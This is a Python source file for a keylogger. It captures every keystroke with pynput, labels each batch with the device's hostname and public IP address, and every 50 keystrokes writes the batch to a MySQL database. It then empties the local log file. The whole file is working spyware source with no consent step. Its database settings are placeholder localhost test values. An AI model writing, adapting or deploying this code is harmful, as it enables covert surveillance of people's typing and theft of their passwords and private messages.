from pynput.keyboard import Key,Listener
import mysql.connector
import socket
from requests import get
from datetime import date

#table creation
'''cursor().execute("CREATE TABLE DeviceKeyStrokes1 (DeviceID VARCHAR(255), rowcontents VARCHAR(255) , date DATE , devicename VARCHAR(255), Linenumber int(255))")'''
'''cursor().execute("CREATE TABLE users (devicename VARCHAR (255) , deviceId VARCHAR (255))")'''
class Sql_Functionality:
	database = mysql.connector.connect(host = "localhost" , user= "test" , password = "test", database = "test")
	deviceName = socket.gethostname()
	deviceId = get('https://api.ipify.org').text

	def RowNumber(self):
		with open("control.txt", "r" ) as file:
			number =file.readline()
		return number
		
		print(number)
	def increase_row_number(self , number):
		currentnumber = int(number)
		with open("control.txt", 'w') as file:
			container =file.write(str(currentnumber+1))
	def Create_User_If_Needed(self):
		linenumber = int(self.RowNumber())
		if linenumber == 1:
			cursor = self.database.cursor()
			cursor.execute("INSERT INTO users (devicename , deviceId) VALUES (%s,%s)" ,(self.deviceName , self.deviceId) )
			self.database.commit() 
			

	def get_date(self):
		currentDate = date.today()
		formattedDate = currentDate.strftime("%Y-%m-%d")
		return formattedDate
	def update_db(self, filecontents):
		for row in filecontents:
			self.Write_values(row)
		self.clear_local_file()

	def clear_local_file(self):# to preserve storage on the machine
		with open('Init.txt', "w") as file:
			file.write(" ")



	def Write_values(self , key):
	
		date = self.get_date()
		rownumber = self.RowNumber()
		cursor = self.database.cursor()
		query = "INSERT INTO DeviceKeyStrokes5 (DeviceID , rowcontents,date ,devicename ,Linenumber) VALUES (%s,%s,%s,%s,%s)"
		cursor.execute(query, (self.deviceId ,key ,date,self.deviceName,rownumber))
		self.database.commit()
		self.increase_row_number(rownumber)


class DataGather(Sql_Functionality):
	def __init__(self):
		Sql_Functionality.__init__(self)

	#placeholders
	target = 50
	keystrokes = 0
	def Filter_Keys(self , file,key):
		
					if str(key) == "Key.enter" or str(key) == "Key.space":
						file.write('\n')
					elif str(key) == "Key.backspace":
						file.write('\n Backspace\n')
					elif str(key) == "Key.shift":
						file.write("")
					else:
						k = str(key).replace("'","")
						file.write(str(k))
					print(key)



	def write_to_local (self, key):
		with open("Init.txt" ,"a") as File:
				self.Filter_Keys(File,key)
		if self.keystrokes == self.target: #Every 50  keystrokes
			with open("Init.txt" , "r") as file1:
				filecont = file1.readlines()
			self.update_db(filecont)
			self.keys =[]
			self.target +=50
		else:
			pass
		
	def onButtonPress(self ,key):
		if key == Key.esc : #if the escape button is pressed
			exit()
		else:
			self.keystrokes += 1
			self.write_to_local(key)
			
	def onButtonRelease(self,keys):
		pass

	def begin_monitoring(self):
		with Listener( on_press=self.onButtonPress,on_release=self.onButtonRelease) as listener:
			listener.join()



if __name__ == "__main__":

	DataGather().Create_User_If_Needed()
	DataGather().begin_monitoring()

